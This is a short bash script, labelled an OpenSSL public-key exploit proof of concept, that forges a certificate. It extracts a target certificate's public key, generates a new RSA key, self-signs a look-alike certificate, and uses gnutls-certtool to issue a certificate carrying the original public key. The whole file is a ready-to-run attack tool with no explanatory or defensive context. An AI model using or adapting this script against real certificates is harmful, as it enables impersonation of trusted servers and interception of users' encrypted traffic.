#!/bin/bash
echo "Openssl Pubkey exploit PoC"
echo "usage: keyspoof cert.crt spoof.key" # change to "keyspoof-v2.sh"
openssl x509 -in $1 -pubkey -noout > $2
openssl genrsa 2048 >> $2
cat $2 >> pub-$2
openssl rsa -in $2 -out $2
openssl x509 -x509toreq -in $1 -signkey $2 >> $2.csr
openssl req -in $2.csr -key $2 -x509 -out $2.crt 
gnutls-certtool -c --load-ca-privkey $2 --load-ca-certificate $2.crt  --load-pubkey pub-$2 --outfile=$2.pem
